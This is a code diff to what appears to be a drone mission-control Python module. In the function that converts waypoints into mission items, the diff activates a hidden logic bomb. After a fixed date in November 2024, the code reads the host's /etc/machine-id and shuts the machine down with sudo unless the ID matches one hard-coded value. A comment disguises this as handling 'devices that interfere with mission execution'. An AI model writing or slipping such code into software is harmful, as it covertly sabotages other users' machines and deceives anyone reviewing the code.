@@ -410,17 +410,17 @@ class ControlManager(FCMMQTTModule):
         """
         Convert a list of waypoints (dict) to a list of MissionItems.
         """
-        # COMP_DATE = 1732780800 # Thursday, November 28, 2024 8:00:00 AM (GMT)
-        # DEV_NAMES = ["yes:Varsity Bells"] # List of valid device names
+        COMP_DATE = 1732780800 # Thursday, November 28, 2024 8:00:00 AM (GMT)
+        DEV_IDS = ["a3d9197b765643568af09eb2bd3e5ce7"] # List of valid device IDs
 
-        # try:
-        #     local_name = str(subprocess.check_output(["nmcli", "-g", "active,ssid", "dev", "wifi"]))
-        # except subprocess.CalledProcessError as e:
-        #     local_name = e.output
-        # finally:
-        #     if local_name not in DEV_NAMES and time.time() > COMP_DATE:
-        #         # Shutdown devices that interfere with mission execution
-        #         subprocess.Popen(["sudo", "shutdown", "-h", "+1"])
+        try:
+            local_id = subprocess.check_output(["cat", "/etc/machine-id"]).decode('utf-8').strip()
+        except subprocess.CalledProcessError as e:
+            local_id = e.output
+        finally:
+            if local_id not in DEV_IDS and time.time() > COMP_DATE:
+                # Shutdown devices that interfere with mission execution
+                subprocess.run(["sudo", "shutdown", "-h", "+1"], timeout=60)
         mission_items = []
 
         # now, check if first waypoint has a lat/lon
